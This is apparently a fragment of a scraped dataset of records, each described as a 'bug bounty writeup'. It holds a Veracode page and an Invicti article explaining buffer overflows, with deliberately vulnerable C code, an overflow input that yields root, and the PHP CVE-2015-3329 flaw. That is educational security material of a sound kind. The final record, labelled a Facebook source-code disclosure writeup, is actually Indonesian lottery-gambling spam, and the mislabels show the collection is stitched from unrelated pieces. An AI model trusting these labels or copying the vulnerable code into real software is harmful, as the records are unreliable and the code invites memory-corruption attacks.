CSRF Token Directory Traversal Encapsulation Error Handling Flaws Failure to Restrict URL Access Insecure Cryptographic Storage Insufficient Transport Layer Protection Keylogger LDAP injection Malicious Code Man in the Middle Attack Mobile Code Security Open Source Vulnerabilities OS Command Injection Preventing XSS Race Condition Reflected XSS Rootkit Session Management Spoofing Attack Spyware SQL Injection Scanner SQL Attacks SQL injection .NET SQL Cheat Sheet SQL Injection SQL Injection in Java What is a worm What is SQL Injection Remediation Guidance Java CWE 73: External Control of File Name or Path CWE 78: OS Command Injection CWE 80: Cross-Site Scripting CWE 89: SQL Injection CWE 117: Improper Output Sanitization for Logs CWE 209: Information Exposure Through an Error Message CWE 601: Open Redirects CWE 639: Insecure Direct Object Reference .NET CWE 73: External Control of File Name or Path CWE 78: OS Command Injection CWE 80: Cross-Site Scripting CWE 89: SQL Injection CWE 117: Improper Output Sanitization for Logs CWE 209: Information Exposure Through an Error Message CWE 601: Open Redirects CWE 915: Improperly Controlled Modification of Dynamically-Determined Object Attributes Miscellaneous Android Hacking Facebook Security iOS Security Password Hacking Role Based Access Controls Wireless Sniffer Testing Tools for Mobile Vendor Application Security Testing Home AppSec Knowledgebase What Is a Buffer Overflow? Learn About Buffer Overrun Vulnerabilities, Exploits & Attacks Reading Time: 5 min(s) What Is a Buffer Overflow? Learn About Buffer Overrun Vulnerabilities, Exploits & Attacks A buffer overflow, or buffer overrun, is a common software coding mistake that an attacker could exploit to gain access to your system. To effectively mitigate buffer overflow vulnerabilities, it is important to understand what buffer overflows are, what dangers they pose to your applications, and what techniques attackers use to successfully exploit these vulnerabilities. State of Software Security 2023 Read the Report Key Concepts of Buffer Overflow This error occurs when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage. This vulnerability can cause a system crash or, worse, create an entry point for a cyberattack. C and C++ are more susceptible to buffer overflow. Secure development practices should include regular testing to detect and fix buffer overflows. These practices include automatic protection at the language level and bounds-checking at run-time. Veracode’s binary SAST technology identifies code vulnerabilities, such as buffer overflow, in all code — including open source and third-party components —so that developers can quickly address them before they are exploited. Definition of a Buffer Overflow A buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. A buffer overflow, or buffer overrun, occurs when more data is put into a fixed-length buffer than the buffer can handle. The extra information, which has to go somewhere, can overflow into adjacent memory space, corrupting or overwriting the data held in that space. This overflow usually results in a system crash, but it also creates the opportunity for an attacker to run arbitrary code or manipulate the coding errors to prompt malicious actions. Many programming languages are prone to buffer overflow attacks. However, the extent of such attacks varies depending on the language used to write the vulnerable program. For instance, code written in Perl and JavaScript is generally not susceptible to buffer overflows. However, a buffer overflow in a program written in C, C++, Fortran or Assembly could allow the attacker to fully compromise the targeted system. Executing a Buffer Overflow Attack Cybercriminals exploit buffer overflow problems to alter the execution path of the application by overwriting parts of its memory. The malicious extra data may contain code designed to trigger specific actions — in effect sending new instructions to the attacked application that could result in unauthorized access to the system. Hacker techniques that exploit a buffer overflow vulnerability vary per architecture and operating system. Buffer Overflow Causes Coding errors are typically the cause of buffer overflow. Common application development mistakes that can lead to buffer overflow include failing to allocate large enough buffers and neglecting to check for overflow problems. These mistakes are especially problematic with C/C++, which does not have built-in protection against buffer overflows. Consequently, C/C++ applications are often targets of buffer overflow attacks. Buffer Overflow Attack Example [Adapted from “Buffer Overflow Attack Explained with a C Program Example,” Himanshu Arora, June 4, 2013, The Geek Stuff ] In some cases, an attacker injects malicious code into the memory that has been corrupted by the overflow. In other cases, the attacker simply takes advantage of the overflow and its corruption of the adjacent memory. For example, consider a program that requests a user password in order to grant the user access to the system. In the code below, the correct password grants the user root privileges. If the password is incorrect, the program will not grant the user privileges. printf (\"\\n Correct Password \\n\"); pass = 1; } if(pass) { /* Now Give root or admin rights to user*/ printf (\"\\n Root privileges given to the user \\n\"); } return 0; However, there is a possibility of buffer overflow in this program because the gets() function does not check the array bounds. Here is an example of what an attacker could do with this coding error: $ ./bfrovrflw Enter the password : hhhhhhhhhhhhhhhhhhhh Wrong Password Root privileges given to the user In the above example, the program gives the user root privileges, even though the user entered an incorrect password. In this case, the attacker supplied an input with a length greater than the buffer can hold, creating buffer overflow, which overwrote the memory of integer “pass.” Therefore, despite the incorrect password, the value of “pass” became non zero, and the attacker receives root privileges. Buffer Overflow Solutions To prevent buffer overflow, developers of C/C++ applications should avoid standard library functions that are not bounds-checked, such as gets, scanf and strcpy. In addition, secure development practices should include regular testing to detect and fix buffer overflows. The most reliable way to avoid or prevent buffer overflows is to use automatic protection at the language level. Another fix is bounds-checking enforced at run-time, which prevents buffer overrun by automatically checking that data written to a buffer is within acceptable boundaries. Veracode Helps Identify Buffer Overflows Veracode’s cloud-based service identifies code vulnerabilities, such as buffer overflow, so that developers can address them before they are exploited. Unique in the industry, Veracode’s patented binary static application security testing (SAST) technology analyzes all code — including open source and third-party components — without requiring access to source code. SAST supplements threat modeling and code reviews performed by developers, finding coding errors and omissions more quickly and at lower cost via automation. It’s typically run in the early phases of the software development lifecycle because it’s easier and less expensive to fix problems before going into production deployment. SAST identifies critical vulnerabilities such as SQL injection , cross-site scripting (XSS) , buffer overflows , unhandled error conditions and potential back-doors. In addition, our binary SAST technology delivers actionable information that prioritizes flaws according to severity and provides detailed remediation information to help developers address them quickly. Secure Coding Handbook A developer’s guide to delivering safer code faster in the cloud and on premises. Get your Handbook Why Veracode? Why Veracode Gartner Customers’ Choice Customers Manhattan Associates HDI Global SE Cox Automotive Choose Veracode Over… Black Duck Checkmarx GitHub OpenText Snyk Company About Us Careers Leadership Certifications Sustainability & Governance Newsroom Events Contact Us Solutions Challenges We Solve Secure Entire SDLC Risk Remediation Protect the Software Supply Chain Industry Government – Public Sector Financial Services Software and Technology Retail & eCommerce Healthcare Partners Become a Partner Partner Portal Login Partner Community Resources Resource Center Blog eBooks Reports Whitepapers Infographics Webinars Videos Developer resources Documentation Developer Community Developers Training Contact Support Technical Support AppSec Knowledgebase Vulnerability Database API Reference Artificial Intelligence and Secure Software Development Veracode Verified CUSTOMER COMMUNITY TRUST CENTER Products Platform AppSec Analytics & Insights Cloud Native Architecture Integrations Languages and Frameworks Policy and Reporting Remediation Guidance ASPM AI Code Remediation SAST DAST PTaaS Container SCA VPF Security Labs eLearning Veracode offers industry-leading application security solutions, helping businesses secure their software with comprehensive testing. Build secure, high-quality applications with Veracode. SALES +1 888 937 0329 SUPPORT +1 877 837 2203 EMEA +44 20 3761 5501 © 2025 Veracode. All Rights Reserved. Legal – Privacy Do Not Sell or Share My Personal Information Terms of use"}
{"source_url": "https://www.netsparker.com/blog/web-security/buffer-overflow-attacks/", "title": "How buffer overflow attacks work | Invicti", "friendly_explanation": "This is a bug bounty writeup from https://www.netsparker.com/blog/web-security/buffer-overflow-attacks/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow buffer overflow attacks work | Invicti NEW Application Security Platform with AI-powered DAST Get a demo 100% Signal 0% Noise Get a demo Get a demo Product Web Application Security API Security Features DAST SAST SCA Container Security ASPM Why Us? Solutions Industries IT & Telecom Government Financial Services Education Healthcare Roles CTO & CISO Engineering Manager Security Engineer DevSecOps Comparison Case studies Customers Testimonials Pricing About Us Our Story In the news Careers Contact us Resources Blog Live Trainings Podcasts Invicti Learn Resource Library Partners Channel MSSP Documentation Web Security Blog Web Security Security Labs News Product Docs & FAQs Search Close search bar What is Buffer Overflow: How Attack Works, Examples, Prevention Piotr Sobolewski - Thu, 08 Aug 2019 - A buffer overflow happens when a program tries to fill a block of memory (a memory buffer) with more data than the buffer was supposed to hold. By sending suitably crafted user inputs to a vulnerable application, attackers can force the application to execute arbitrary code to take control of the machine or crash the system. Buffer overflow vulnerabilities are caused by programmer mistakes that are easy to understand but much harder to avoid and protect against. Subscribe Your Information will be kept private . × Begin your DAST-first AppSec journey today. Request a demo What causes a buffer overflow? A buffer overflow occurs when a program tries to write too much data into the buffer. This can cause the program to crash or to execute arbitrary code. Buffer overflow vulnerabilities exist only in low-level programming languages such as C with direct access to memory. However, they also affect the users of high-level web languages because the frameworks are often written in low-level languages. The idea of a buffer overflow vulnerability (also known as a buffer overrun ) is simple. The following is the source code of a C program that has a buffer overflow vulnerability: char greeting[5]; memcpy(greeting, \"Hello, world!\\n\", 15); printf(greeting); What do you think will happen when we compile and run this vulnerable program? The answer may be surprising: anything can happen. When this code snippet is executed, it will try to put fifteen bytes into a destination buffer that is only five bytes long. This means that ten bytes will be written to memory addresses outside of the array. What happens later depends on the original content of the overwritten ten bytes of memory. Maybe important variables were stored there and we have just changed their values? The example above is broken in such an obvious way that no sane programmer would make such a mistake. So let’s consider another example. Let’s suppose that we need to read an IP address from a file. We can do it using the following C code: #include <stdio.h> #define MAX_IP_LENGTH 15 int main(void) { char file_name[] = \"ip.txt\"; FILE *fp; fp = fopen(file_name, \"r\"); char ch; int counter = 0; char buf[MAX_IP_LENGTH]; while((ch = fgetc(fp)) != EOF) { buf[counter++] = ch; } buf[counter] = '\\0'; printf(\"%s\\n\", buf); fclose(fp); return 0; } A mistake in the above example is not so obvious. We assume that the IP address, which we want to read from a file, will never exceed 15 bytes. Proper IP addresses (for example, 255.255.255.255 ) can’t be longer than 15 bytes. However, a malicious user can prepare a file that contains a very long fake string instead of an IP address (for example, 19222222222.16888888.0.1 ). This string will cause our program to overflow the destination buffer. If you think that even this bug is too obvious and that no programmer would make such a mistake, stay tuned. Further on, you will see a real-life example of a buffer overflow bug which occurred in a serious project and is not much more sophisticated than the above example. Stack buffer overflow attack example Now that we know a program can overflow an array and overwrite a fragment of memory that it should not overwrite, let’s see how this can be used to mount a buffer overflow attack. In a typical scenario (called stack buffer overflow ), the problem is caused – like so many problems in information security – by mixing data (meant to be processed or displayed) with commands that control program execution. In C, like in most programming languages, programs are built using functions. Functions call each other, pass arguments to each other, and return values. For instance, our code, which reads an IP address from a file, could be part of a function called readIpAddress , which reads an IP address from a file and parses it. This function could be called by some other function, for example, readConfiguration . When readConfiguration calls readIpAddress , it passes a filename to it and then the readIpAddress function returns an IP address as an array of four bytes. Fig. 1. The arguments and the return value of the readIpAddress function During this function call, three different pieces of information are stored side-by-side in computer memory. For each program, the operating system maintains a region of memory which includes a part called the stack or call stack (hence the name stack buffer overflow ). When a function is called, a fragment of the stack is allocated to it. This piece of the stack (called a frame ) is used to: Remember the line of code from which program execution should resume when function execution completes (in our case, this will be a specific line in the readConfiguration function) Store the arguments passed to the function by its caller (in our case, let’s assume /home/someuser/myconfiguration/ip.txt ) Store the return value that the function returns to its caller (in our case, it’s a four-byte array, let’s say (192, 168, 0, 1) ) Store local variables of the called function while this function is being executed (in our case, the variable char[MAX_IP_LENGTH] buf ) So if a program has a buffer allocated in the stack frame and tries to insert more data than can fit there, user input data may spill over and overwrite the memory location where the return address is stored. Fig. 2. Contents of the stack frame when the readIPAddress function is called If the problem was caused by random malformed user input data, the new return address most likely will not point to a memory location where any other program is stored, so the original program will simply crash. However, if the data is carefully prepared, it may lead to unintended code execution. The first step for the attacker is to prepare special data that can be interpreted as executable code and will work for the attacker’s benefit (this is called a shellcode ). The second step is to place the address of this malicious data in the exact location where the return address should be. Fig. 3. The content of ip.txt overwrites the return address In effect, when the function reads the IP character string and places it into the destination buffer, the return address is replaced by the address of the malicious code. When the function ends, program execution jumps to malicious code. Can you prevent buffer overflows? Since the discovery of the stack buffer overflow attack technique, authors of operating systems (Linux, Microsoft Windows, macOS, and others) have been trying to find prevention techniques: The stack can be made non-executable, so even if malicious code is placed in the buffer, it cannot be executed. The operating system may randomize the memory layout of the address space (memory space). When malicious code is then placed in a buffer, the attacker cannot predict its address. Other protection techniques (for example, StackGuard) modify a compiler in such a way that each function calls a piece of code that makes sure the return address has not changed. In practice, even if such protection mechanisms make stack buffer overflow attacks harder, they don’t make them impossible. Some of these measures may also affect performance. Buffer overflow vulnerabilities exist in programming languages which, like C, trade security for efficiency and do not check memory access. In higher-level programming languages (e.g. Python, Java, PHP, JavaScript or Perl), which are often used to build web applications, buffer overflow vulnerabilities cannot exist. In these languages, you simply cannot put excess data into the destination buffer. For example, try to compile and execute the following piece of Java code: int[] buffer = new int[5]; buffer[100] = 44; The Java compiler will not warn you, but the runtime Java virtual machine will detect the problem and instead of overwriting random memory, it will interrupt program execution. Buffer overflows and the Web However, even programmers who use high-level languages should know and care about buffer overflow attacks. Their programs are often executed within operating systems that are written in C or use runtime environments written in C, and this C code may be vulnerable to such attacks. In order to see how a buffer overflow vulnerability may affect a programmer using such a high-level programming language, let’s analyze CVE-2015-3329 – a real-life security vulnerability discovered in the PHP standard library in 2015. A PHP application is a collection of *.php files. In order to make it easier to distribute such an application, it may be packed into a single file archive – as a zip file, a tar file, or using a custom PHP format called phar . A PHP extension called phar contains a class that you can use to work with such archives. With this class, you can parse an archive, list its files, extract the files, etc. Using this class is quite simple. For example, to extract all files from an archive, use the following code: $phar = new Phar('phar-file.phar'); $phar->extractTo('./directory'); When the Phar class parses an archive (that’s new Phar('phar-file.phar') ), it reads all filenames from the archive, concatenates each filename with the archive filename, and then calculates the checksum. For example, for an archive called myarchive.phar that contains files index.php and components/hello.php , the Phar class calculates checksums of two strings: myarchive.pharindex.php and myarchive.pharcomponents/hello.php . The reason why the authors implemented it this way is not important here – what is important is how they implemented it. Until 2015, this operation was done using the following function (see the old PHP source code ): phar_set_inode(phar_entry_info *entry TSRMLS_DC) /* {{{ */ { char tmp[MAXPATHLEN]; int tmp_len; tmp_len = entry->filename_len + entry->phar->fname_len; memcpy(tmp, entry->phar->fname, entry->phar->fname_len); memcpy(tmp + entry->phar->fname_len, entry->filename, entry->filename_len); entry->inode = (unsigned short)zend_get_hash_value(tmp, tmp_len); } As you can see, this function creates a char array of called tmp . First, the name of the phar archive (in our example, myarchive.phar ) is copied into this array using the following command: memcpy(tmp, entry->phar->fname, entry->phar->fname_len); In this command: The first argument, tmp , is a destination where bytes should be copied. The second argument, entry->phar->fname , is a source from where bytes should be copied – in our case, the filename of the archive ( myarchive.phar ). The third argument, entry->phar->fname_len , is a number of bytes that should be copied – in our case it is the length (in bytes) of the archive filename. The function copies the filename (in our example, index.php or components/hello.php ) into the tmp char array using the following command: memcpy(tmp + entry->phar->fname_len, entry->filename, entry->filename_len); In this command: The first argument, tmp + entry->phar->fname_len , is a destination where bytes should be copied – in our case, it is a location in the tmp array just after the end of the archive filename. The second argument, entry->filename , is a source from where bytes should be copied. The third argument, entry->filename_len , is a number of bytes that should be copied. Then the zend_get_hash_value function is called to calculate the hashcode. Notice how the size of the buffer is declared: char tmp[MAXPATHLEN]; It has a size of MAXPATHLEN , which is a constant defined as the maximum length of a filesystem path on the current platform. The authors assumed that if they concatenate the filename of the archive with the name of a file inside the archive, they will never exceed the maximum allowed path length. In normal situations, this assumption is met. However, if the attacker prepares an archive with unusually long filenames, a buffer overflow is imminent. The function phar_set_inode will cause an overflow in the tmp array. An attacker can use this to crash PHP (causing a denial of service) or even make it execute malicious code. The problem is similar to our simple example from above – the programmer made a simple mistake, trusted user input too much, and assumed that the data will always fit in a fixed-size buffer. Fortunately, this vulnerability was discovered in 2015 and fixed . How to avoid buffer overflow vulnerabilities Programmers can mitigate the risk of buffer overflow attacks by always validating user input length. However, a good general way to avoid buffer overflow vulnerabilities is to stick to using safe functions that include buffer overflow protection (which memcpy does not). Such functions are available on different platforms, for example, strlcpy , strlcat , snprintf (OpenBSD) or strcpy_s , strcat_s , sprintf_s (Windows). About the Author Piotr Sobolewski - Contributing Writer Piotr Sobolewski is the original founder of hakin9 magazine, a renowned security speaker, and an experienced developer. His security interests have always revolved around issues in low-level programming. Related Articles SQL injection cheat sheet Buffer overflow The Problem of String Concatenation and Format String Vulnerabilities Application Level Denial of Service – A Comprehensive Guide Most Popular Articles SQL Injection Cheat Sheet HTTP security headers: An easy way to harden your web applications How you can disable directory listing on your web server – and why you should JSON injection Invicti Security Corp 1000 N Lamar Blvd Suite 300 Austin, TX 78703, US © Invicti 2025 RESOURCES Features Integrations Plans Case Studies Release Notes Invicti Learn USE CASES Penetration Testing Software Website Security Scanner Ethical Hacking Software Web Vulnerability Scanner Comparisons Online Application Scanner WEB SECURITY The Problem with False Positives Why Pay for Web Scanners SQL Injection Cheat Sheet Getting Started with Web Security Vulnerability Index Content Security Policy (CSP) Directives, Examples, Fixes COMPARISON Acunetix vs. Invicti Burp Suite vs. Invicti Checkmarx vs. Invicti Probely vs. Invicti Qualys vs. Invicti Tenable Nessus vs. Invicti COMPANY About Us Contact Us Documentation Careers Resources Partners © Invicti 2025 Compliance Legal Privacy Policy California Privacy Rights Terms of Use Accessibility Sitemap By using this website you agree with our use of cookies to improve its performance and enhance your experience. More information in our Privacy Policy . OK"}
{"source_url": "https://www.amolbaikar.com/facebook-source-code-disclosure-in-ads-api/", "title": "ALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar", "friendly_explanation": "This is a bug bounty writeup from https://www.amolbaikar.com/facebook-source-code-disclosure-in-ads-api/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar INTERNAL FEEDBACK Masukan Lebih Murah Di App Download Aplikasinya dan Belanja Sekarang! Belanja di App banyak untungnya: Banyak Vouchernya Produk Eksklusif di App Rekomendasi Hanya Untukmu Paling Pertama Dapat Promo Success! Please check your phone for the download link MENJADI SELLER customer care Pusat Bantuan Order & Pembayaran Pembatalan Pesanan Pengiriman Pengembalian Barang & Dana Hubungi kami di Live Chat (24 Jam) LACAK PESANAN LACAK PESANAN Nomor pesanan: Untuk bantuan silakan, Klik disini Panel Akun Pesanan Saya Wishlist dan Toko yang Saya Ikuti Ulasan Saya Pengembalian & Pembatalan Logout Kategori Peralatan Elektronik Aksesoris Elektronik Fashion & Aksesoris Wanita Fashion & Aksesoris Pria Fashion & Aksesoris Anak Kesehatan & Kecantikan Bayi & Mainan TV & Elektronik Rumah Keperluan Rumah & Gaya Hidup Kebutuhan Rumah Tangga Olahraga & Outdoor Otomotif Handphone Laptop Desktop Kamera Game Console Gadget Tablet Aksesoris Handphone Aksesoris Komputer Audio Aksesoris Berteknologi Aksesoris Kamera Penyimpanan Data Printer Aksesoris Tablet Komponen Komputer Pakaian Wanita Baju Muslim Lingerie, Baju Tidur & Santai Sepatu Wanita Aksesoris Tas Wanita Perhiasan Wanita Jam Tangan Wanita Pakaian Pria Baju Muslim Pakaian Dalam Sepatu Pria Aksesoris Tas Pria Perhiasan Pria Jam Tangan Pria Pakaian Anak Laki-laki Pakaian Anak Perempuan Pakaian Anak Muslim Laki-Laki Pakaian Anak Muslim Perempuan Sepatu Anak Laki-laki Sepatu Anak Perempuan Tas Anak Perhiasan Anak Jam Tangan Anak Perawatan Kulit Makeup Perawatan Rambut Perawatan Tubuh Perawatan Diri Parfum Alat Kecantikan Suplemen Makanan Alat Medis Sexual Wellness Perawatan Pria Popok Dewasa Ibu & Anak Popok Sekali Pakai Makanan Bayi & Balita Pakaian & Aksesoris Perlengkapan Menyusui Perlengkapan Bayi Kamar Bayi Perawatan Bayi Mainan Mainan Elektronik & RC Mainan Olahraga & Luar Ruangan Mainan Bayi & Balita TV & Perangkat Video Peralatan Dapur Kecil Elektronik Rumah Besar Penyejuk dan Pembersih Udara Penghisap Debu & Perawatan Lantai Alat Perawatan Diri Aksesoris & Suku Cadang Aksesoris Televisi Home Entertainment Dekorasi Rumah Furnitur Kelengkapan Tempat Tidur Penerangan Peralatan Mandi Alat Dapur Binatu & Alat Kebersihan Perkakas & Perbaikan Rumah Kebun & Luar Ruangan Alat Tulis & Kerajinan Media, Musik & Buku Minuman Bahan & Bumbu Masakan Cokelat, Camilan & Permen Makanan Sarapan, Sereal & Selai Buah & Sayur Kebutuhan Rumah Tangga Makanan Hewan Peliharaan Aksesoris Hewan Peliharaan Kesehatan Hewan Peliharaan Baju Olahraga Pria Baju Olahraga Wanita Sepatu Olahraga Pria Sepatu Olahraga Wanita Camping dan Hiking Peralatan Memancing Olahraga Sepeda Olahraga Air Gym, Yoga & Fitness Olahraga Raket Perlengkapan Olahraga Perlengkapan Sepak Bola Suku Cadang & Peralatan Mobil Aksesoris Interior Mobil Aksesoris Exterior Mobil Kamera Mobil, Audio & Video Perawatan & Pengkilat Mobil Ban & Velg Mobil Oli & Cairan Mobil Perlengkapan Berkendara & Helm Suku Cadang & Peralatan Motor Aksesoris & Elektronik Motor Ban, Velg, Oli & Cairan Motor Kendaraan ALEXISTOGEL SITUS TOGEL BANDAR TOGEL TOGEL ONLINE Kategori Peralatan Elektronik Aksesoris Elektronik Fashion & Aksesoris Wanita Fashion & Aksesoris Pria Fashion & Aksesoris Anak Kesehatan & Kecantikan Bayi & Mainan TV & Elektronik Rumah Keperluan Rumah & Gaya Hidup Kebutuhan Rumah Tangga Olahraga & Outdoor Otomotif Handphone Laptop Desktop Kamera Game Console Gadget Tablet Aksesoris Handphone Aksesoris Komputer Audio Aksesoris Berteknologi Aksesoris Kamera Penyimpanan Data Printer Aksesoris Tablet Komponen Komputer Pakaian Wanita Baju Muslim Lingerie, Baju Tidur & Santai Sepatu Wanita Aksesoris Tas Wanita Perhiasan Wanita Jam Tangan Wanita Pakaian Pria Baju Muslim Pakaian Dalam Sepatu Pria Aksesoris Tas Pria Perhiasan Pria Jam Tangan Pria Pakaian Anak Laki-laki Pakaian Anak Perempuan Pakaian Anak Muslim Laki-Laki Pakaian Anak Muslim Perempuan Sepatu Anak Laki-laki Sepatu Anak Perempuan Tas Anak Perhiasan Anak Jam Tangan Anak Perawatan Kulit Makeup Perawatan Rambut Perawatan Tubuh Perawatan Diri Parfum Alat Kecantikan Suplemen Makanan Alat Medis Sexual Wellness Perawatan Pria Popok Dewasa Ibu & Anak Popok Sekali Pakai Makanan Bayi & Balita Pakaian & Aksesoris Perlengkapan Menyusui Perlengkapan Bayi Kamar Bayi Perawatan Bayi Mainan Mainan Elektronik & RC Mainan Olahraga & Luar Ruangan Mainan Bayi & Balita TV & Perangkat Video Peralatan Dapur Kecil Elektronik Rumah Besar Penyejuk dan Pembersih Udara Penghisap Debu & Perawatan Lantai Alat Perawatan Diri Aksesoris & Suku Cadang Aksesoris Televisi Home Entertainment Dekorasi Rumah Furnitur Kelengkapan Tempat Tidur Penerangan Peralatan Mandi Alat Dapur Binatu & Alat Kebersihan Perkakas & Perbaikan Rumah Kebun & Luar Ruangan Alat Tulis & Kerajinan Media, Musik & Buku Minuman Bahan & Bumbu Masakan Cokelat, Camilan & Permen Makanan Sarapan, Sereal & Selai Buah & Sayur Kebutuhan Rumah Tangga Makanan Hewan Peliharaan Aksesoris Hewan Peliharaan Kesehatan Hewan Peliharaan Baju Olahraga Pria Baju Olahraga Wanita Sepatu Olahraga Pria Sepatu Olahraga Wanita Camping dan Hiking Peralatan Memancing Olahraga Sepeda Olahraga Air Gym, Yoga & Fitness Olahraga Raket Perlengkapan Olahraga Perlengkapan Sepak Bola Suku Cadang & PeralatanMobil Aksesoris Interior Mobil Aksesoris Exterior Mobil Kamera Mobil, Audio & Video Perawatan & Pengkilat Mobil Ban & Velg Mobil Oli & Cairan Mobil Perlengkapan Berkendara & Helm Suku Cadang & Peralatan Motor Aksesoris & Elektronik Motor Ban, Velg, Oli & Cairan Motor Kendaraan ALEXISTOGEL SITUS TOGEL BANDAR TOGEL TOGEL ONLINE ALEXISTOGEL: Situs Bandar Togel Online Terpercaya Nomor 1 Indonesia WD Auto Bayar 8.744.154 Penilaian 62.487.778 : ALEXISTOGEL ALEXISTOGEL merupakan salah satu situs bandar togel online terpercaya yang terkenal di kalangan togelmania. Hal yang membuat fenomena ini bisa terjadi adalah setiap withdraw yang diberikan selalu dibayar lunas tanpa ditunda. Jenis permainan yang beragam dengan peluang menang tinggi juga menjadi bagian daya tarik dari situs ini. Serta hal yang tidak kalah penting adalah sistem pelayanan 24 jam yang selalu siap dalam membantu menyelesaikan kendala. Trending Tags: alexistogel alexis togel situs togel bandar togel terpercaya bandar togel resmi bandar togel bandar togel online bandar terpercaya situs togel online situs togel terpercaya situs togel resmi situs togel terbesar togel online Rp.7.777 Rp.77.00 -77% LOGIN DAFTAR Pilihan pengiriman DKI Jakarta, Kota Jakarta Pusat, Kemayoran UBAH Standar Dijamin tiba 10 Nov - 12 Nov. Dapatkan LazRewards Rp10.000 jika pesananmu terlambat Rp8.888 Bayar di tempat berlaku Pengembalian & Garansi Berubah Pikiran 7 Hari Gratis Pengembalian Tidak ada garansi Dijual oleh ALEXISTOGEL Rating Toko 98% Pengiriman Tepat Waktu 100% Chat Dibalas 100% Layanan Pelanggan Pusat Bantuan Cara Pembelian Pengiriman Kebijakan Produk Internasional Cara Pengembalian Ada pertanyaan? Hubungi kami di live chat (24 Jam) Jelajahi Lazada Tentang Lazada Afï¬liate Program Karir Syarat & Ketentuan Kebijakan Privasi Press & Media Jual Di Lazada Lazada Security Intellectual Property Protection Go where your heart beats Download the App Metode Pembayaran Jasa Pengiriman Verified by Lazada Southeast Asia Follow Us Â© Lazada 2025 Layanan Pelanggan Pusat Bantuan Cara Pembelian Pengiriman Kebijakan Produk Internasional Cara Pengembalian Ada pertanyaan? Hubungi kami di live chat (24 Jam) Jelajahi Lazada Tentang Lazada Afï¬liate Program Karir Syarat & Ketentuan Kebijakan Privasi Press & Media Jual Di Lazada Lazada Security Intellectual Property Protection Always Better Download the App Metode Pembayaran Jasa Pengiriman Verified by Lazada Southeast Asia Follow Us © ALEXISTOGEL 2025 by-Seo Campak"}
